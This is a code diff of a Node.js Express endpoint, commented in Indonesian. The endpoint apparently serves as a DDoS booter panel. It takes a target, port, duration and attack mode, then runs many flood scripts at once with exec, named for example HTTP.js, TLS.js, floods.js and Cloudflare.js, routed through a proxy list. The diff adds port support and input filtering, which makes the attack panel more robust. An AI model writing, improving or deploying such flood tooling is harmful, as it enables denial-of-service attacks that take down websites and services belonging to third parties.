@@ -58,57 +58,67 @@ async function fetchData() {
 }
 
 app.get('/exc', (req, res) => {
-  const { target, time, methods } = req.query;
+  // 1. Mengambil parameter target, time, methods, dan port dari query string
+  const { target, time, methods, port } = req.query;
+
+  // 2. Sanitasi & Default Value
+  // Memastikan port hanya angka. Jika tidak diisi, default ke 80 atau 443 sesuai kebutuhan.
+  const safePort = port ? port.replace(/[^0-9]/g, "") : "443"; 
+  const safeTarget = target ? target.replace(/[^a-zA-Z0-9.:/-]/g, "") : "";
+  const safeTime = time ? time.replace(/[^0-9]/g, "") : "60";
 
   res.status(200).json({
     message: 'API request received. Executing script shortly, By Snith #Exercist',
-    target,
-    time,
+    target: safeTarget,
+    port: safePort,
+    time: safeTime,
     methods
   });
 
+  // 3. Logika Eksekusi dengan menyertakan port
+  // Catatan: Pastikan file .js di folder /methods sudah mendukung argumen port tersebut.
   
   if (methods === 'LESUS') {
-    exec(`node ./methods/H2CA.js ${target} ${time} 100 10 proxy.txt`);
-    exec(`node ./methods/HDRH2.js ${target} ${time} 10 100 true`);
-    exec(`node ./methods/H2F3.js ${target} ${time} 100 10 proxy.txt`);
-    exec(`node ./methods/BLAST.js ${target} ${time} 100 10 proxy.txt`);
+    exec(`node ./methods/H2CA.js ${safeTarget} ${safePort} ${safeTime} 100 10 proxy.txt`);
+    exec(`node ./methods/HDRH2.js ${safeTarget} ${safePort} ${safeTime} 10 100 true`);
+    exec(`node ./methods/H2F3.js ${safeTarget} ${safePort} ${safeTime} 100 10 proxy.txt`);
+    exec(`node ./methods/BLAST.js ${safeTarget} ${safePort} ${safeTime} 100 10 proxy.txt`);
    } else if (methods === 'KOMIX') {
-    exec(`node ./methods/HTTP.js ${target} ${time}`);
-    exec(`node ./methods/HTTPS.js ${target} ${time} 100 10 proxy.txt`);
-    exec(`node ./methods/HTTPX.js ${target} ${time} 100 10 proxy.txt`);
-    exec(`node ./methods/BLAST.js ${target} ${time} 100 10 proxy.txt`);
+    exec(`node ./methods/HTTP.js ${safeTarget} ${safePort} ${safeTime}`);
+    exec(`node ./methods/HTTPS.js ${safeTarget} ${safePort} ${safeTime} 100 10 proxy.txt`);
+    exec(`node ./methods/HTTPX.js ${safeTarget} ${safePort} ${safeTime} 100 10 proxy.txt`);
+    exec(`node ./methods/BLAST.js ${safeTarget} ${safePort} ${safeTime} 100 10 proxy.txt`);
     } else if (methods === 'R2') {
-    exec(`node ./methods/TLS.js ${target} ${time} 100 10 proxy.txt`);
-    exec(`node ./methods/R2.js ${target} ${time} 100 10 proxy.txt`);
-    exec(`node ./methods/RAND.js ${target} ${time}`);
-    exec(`node ./methods/BLAST.js ${target} ${time} 100 10 proxy.txt`);
+    exec(`node ./methods/TLS.js ${safeTarget} ${safePort} ${safeTime} 100 10 proxy.txt`);
+    exec(`node ./methods/R2.js ${safeTarget} ${safePort} ${safeTime} 100 10 proxy.txt`);
+    exec(`node ./methods/RAND.js ${safeTarget} ${safePort} ${safeTime}`);
+    exec(`node ./methods/BLAST.js ${safeTarget} ${safePort} ${safeTime} 100 10 proxy.txt`);
     } else if (methods === 'PSHT') {
-    exec(`node ./methods/H2CA.js ${target} ${time} 100 10 proxy.txt`);
-    exec(`node ./methods/HDRH2.js ${target} ${time} 10 100 true`);
-    exec(`node ./methods/H2F3.js ${target} ${time} 100 10 proxy.txt`);
-    exec(`node ./methods/HTTP.js ${target} ${time}`);
-    exec(`node ./methods/RAND.js ${target} ${time}`);
-    exec(`node ./methods/TLS.js ${target} ${time} 100 10 proxy.txt`);
-    exec(`node ./methods/R2.js ${target} ${time} 100 10 proxy.txt`);
-    exec(`node ./methods/HTTPS.js ${target} ${time} 100 10 proxy.txt`);
-    exec(`node ./methods/HTTPX.js ${target} ${time} 100 10 proxy.txt`);
-    exec(`node ./methods/BLAST.js ${target} ${time} 100 10 proxy.txt`);
+    exec(`node ./methods/H2CA.js ${safeTarget} ${safePort} ${safeTime} 100 10 proxy.txt`);
+    exec(`node ./methods/HDRH2.js ${safeTarget} ${safePort} ${safeTime} 10 100 true`);
+    exec(`node ./methods/H2F3.js ${safeTarget} ${safePort} ${safeTime} 100 10 proxy.txt`);
+    exec(`node ./methods/HTTP.js ${safeTarget} ${safePort} ${safeTime}`);
+    exec(`node ./methods/RAND.js ${safeTarget} ${safePort} ${safeTime}`);
+    exec(`node ./methods/TLS.js ${safeTarget} ${safePort} ${safeTime} 100 10 proxy.txt`);
+    exec(`node ./methods/R2.js ${safeTarget} ${safePort} ${safeTime} 100 10 proxy.txt`);
+    exec(`node ./methods/HTTPS.js ${safeTarget} ${safePort} ${safeTime} 100 10 proxy.txt`);
+    exec(`node ./methods/HTTPX.js ${safeTarget} ${safePort} ${safeTime} 100 10 proxy.txt`);
+    exec(`node ./methods/BLAST.js ${safeTarget} ${safePort} ${safeTime} 100 10 proxy.txt`);
    } else if (methods === 'pidoras') {
-    exec(`node ./methods/H2CA.js ${target} ${time} 100 10 proxy.txt`);
-    exec(`node ./methods/pidoras.js ${target} ${time} 100 10 proxy.txt`);
-    exec(`node ./methods/floods.js ${target} ${time} 100 10 proxy.txt`);
-    exec(`node ./methods/browser.js ${target} ${time} 100 10 proxy.txt`);
-    exec(`node ./methods/HDRH2.js ${target} ${time} 10 100 true`);
-    exec(`node ./methods/H2F3.js ${target} ${time} 100 10 proxy.txt`);
-    exec(`node ./methods/HTTP.js ${target} ${time}`);
-    exec(`node ./methods/Cloudflare.js ${target} ${time} 100`);
-    exec(`node ./methods/RAND.js ${target} ${time}`);
-    exec(`node ./methods/TLS.js ${target} ${time} 100 10 proxy.txt`);
-    exec(`node ./methods/R2.js ${target} ${time} 100 10 proxy.txt`);
-    exec(`node ./methods/HTTPS.js ${target} ${time} 100 10 proxy.txt`);
-    exec(`node ./methods/HTTPX.js ${target} ${time} 100 10 proxy.txt`);
-    exec(`node ./methods/BLAST.js ${target} ${time} 100 10 proxy.txt`);
+    exec(`node ./methods/H2CA.js ${safeTarget} ${safePort} ${safeTime} 100 10 proxy.txt`);
+    exec(`node ./methods/pidoras.js ${safeTarget} ${safePort} ${safeTime} 100 10 proxy.txt`);
+    exec(`node ./methods/floods.js ${safeTarget} ${safePort} ${safeTime} 100 10 proxy.txt`);
+    exec(`node ./methods/browser.js ${safeTarget} ${safePort} ${safeTime} 100 10 proxy.txt`);
+    exec(`node ./methods/HDRH2.js ${safeTarget} ${safePort} ${safeTime} 10 100 true`);
+    exec(`node ./methods/H2F3.js ${safeTarget} ${safePort} ${safeTime} 100 10 proxy.txt`);
+    exec(`node ./methods/HTTP.js ${safeTarget} ${safePort} ${safeTime}`);
+    exec(`node ./methods/Cloudflare.js ${safeTarget} ${safePort} ${safeTime} 100`);
+    exec(`node ./methods/RAND.js ${safeTarget} ${safePort} ${safeTime}`);
+    exec(`node ./methods/TLS.js ${safeTarget} ${safePort} ${safeTime} 100 10 proxy.txt`);
+    exec(`node ./methods/R2.js ${safeTarget} ${safePort} ${safeTime} 100 10 proxy.txt`);
+    exec(`node ./methods/HTTPS.js ${safeTarget} ${safePort} ${safeTime} 100 10 proxy.txt`);
+    exec(`node ./methods/HTTPX.js ${safeTarget} ${safePort} ${safeTime} 100 10 proxy.txt`);
+    exec(`node ./methods/BLAST.js ${safeTarget} ${safePort} ${safeTime} 100 10 proxy.txt`);
    }
    else {
     console.log('Metode tidak dikenali atau format salah.');
